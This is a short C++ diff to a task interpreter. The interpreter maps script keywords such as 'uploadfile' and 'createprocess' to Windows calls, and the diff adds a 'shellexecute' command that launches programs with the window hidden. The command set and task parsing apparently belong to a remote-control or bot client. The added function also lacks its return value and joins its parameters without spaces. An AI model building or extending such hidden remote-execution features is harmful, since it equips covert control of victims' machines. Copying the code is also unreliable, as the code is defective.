@@ -53,6 +53,7 @@ namespace interpreter {
 		funcMap[L"uploadfile"].pointer = (*uploadfile);
 		funcMap[L"createprocess"].pointer = (*createprocesswrap);
 		funcMap[L"wallpaper"].pointer = (*setWallpaper);
+		funcMap[L"shellexecute"].pointer = (*shellexecutewrap);
 		bool f = true;
 		std::wstringstream ts(task);
 		std::wstring line;
@@ -173,6 +174,13 @@ namespace interpreter {
 		std::wstring dir = std::wstring(PathToFile).substr(0, pos);
 		dir += L"\\"+args[1];
 		SystemParametersInfoW(SPI_SETDESKWALLPAPER, 1, (void*)dir.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+	}
+	
+	bool shellexecutewrap(std::vector<std::wstring> args) {
+		std::wstring params= L"";
+		for (int i = 3; i < args.size(); i++)
+			params += args[i];
+		ShellExecuteW(NULL,args[1].c_str(),args[2].c_str(), params.c_str(),NULL,0);
 	}
 
 	
